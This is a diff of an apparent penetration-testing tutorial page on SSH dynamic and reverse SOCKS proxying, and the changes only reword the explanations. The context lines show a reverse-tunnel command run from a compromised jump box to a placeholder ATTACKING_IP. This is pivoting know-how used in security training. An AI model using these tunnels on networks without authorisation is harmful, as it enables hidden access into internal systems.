@@ -69,7 +69,7 @@ Ensure to generate SSH keys for the tunnel user, and subsequently, add the gener
 {% tab title="Forward Proxy" %}
 its possible to create a **Dynamic Port Forwarding (Forward proxy)** using SSH.&#x20;
 
-For example, by using the following command on our attacking host, SOCKS port `9090` will be opened on our attacking machine. Traffic sent via this port will be routed to the jump box SSH connection.
+For example, by using the following command on our attacking host, SOCKS port `9090` will be opened on our attacking machine. Traffic sent via this port will be pushed through the SSH tunnel to the Jump Host, then forwarded wherever they are addressed.
 
 ```bash
 # -D : dynamic port forward
@@ -95,7 +95,7 @@ socks5 127.0.0.1 9090
 {% tab title="Reverse Proxy" %}
 In newer versions of the SSH client, it is also possible to create a **Reverse Proxy** (the equivalent of the `-D` switch used in local connections). This **may not work in older clients**, but this command can be used to create a reverse proxy in clients which do support it.
 
-By using this command on the compromised host (jump-box), SOCKS port `9090` will be opened on our attacking machine. Traffic sent via this port will be routed to the jump-box SSH connection.
+By using this command on the compromised host (jump box), SOCKS port `9090` will be opened on our attacking machine. Traffic sent via this port will be pushed through the SSH tunnel to the jump box, then forwarded wherever they are addressed.
 
 ```bash
 PC> ssh -R 9090 tunneluser@ATTACKING_IP -fN
